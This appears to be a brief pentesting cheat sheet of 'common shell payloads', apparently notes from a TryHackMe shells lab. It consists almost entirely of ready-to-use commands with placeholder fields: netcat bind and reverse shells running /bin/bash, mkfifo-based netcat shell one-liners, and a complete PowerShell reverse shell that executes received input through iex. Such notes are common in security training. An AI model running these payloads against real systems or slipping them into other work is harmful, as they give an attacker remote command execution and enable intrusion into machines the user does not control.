# Common Shell Payloads

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

### Execute a Process on Connection
```
nc -lvnp [PORT] -e [PROCESS]
```
Example:
```
nc -lvnp 8686 -e /bin/bash
```
For a Reverse Shell:
```
nc [LOCAL-IP] [PORT] -e /bin/bash
```
*********************************************************************************

### Create a Listener for a Bind Shell (Linux):
```
mkfifo /tmp/f; nc -lvnp [PORT] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
Similar Command can be Used to Send a Netcat Reverse Shell:
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
*********************************************************************************

### Standard One-liner PowerShell Reverse Shell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('[IP-ADDRESS]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
*Ensure [IP-ADDRESS] and [PORT] are filled*
*********************************************************************************

### Reference
https://tryhackme.com/room/introtoshells
